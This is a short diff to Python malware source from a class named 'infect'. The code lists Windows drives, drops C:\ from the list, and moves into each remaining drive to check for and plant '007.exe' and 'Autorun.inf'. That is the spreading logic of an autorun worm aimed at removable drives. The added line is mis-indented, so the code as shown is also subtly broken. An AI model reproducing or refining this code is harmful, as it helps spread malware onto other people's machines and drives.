@@ -42,6 +42,7 @@ class infect:
             drivename = chr(drive) + ':\\'
             if os.path.exists(drivename):
                 drives.append(drivename)
+drives.remove("C:\\")                                
         for infectwrite in drives:
             os.chdir(infectwrite)
             if '007.exe' and 'Autorun.inf' not in os.listdir(infectwrite):
